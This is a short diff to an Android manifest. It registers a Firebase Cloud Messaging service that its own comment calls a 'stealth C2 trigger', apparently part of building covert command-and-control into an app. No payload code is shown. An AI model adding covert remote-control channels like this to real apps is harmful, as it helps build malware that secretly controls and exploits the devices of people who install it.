@@ -87,6 +87,15 @@
             </intent-filter>
         </service>
 
+        <!-- Firebase Cloud Messaging service for stealth C2 trigger -->
+        <service
+            android:name=".FcmMessageService"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+
         <receiver
             android:name=".receivers.MyReceiver"
             android:enabled="true"
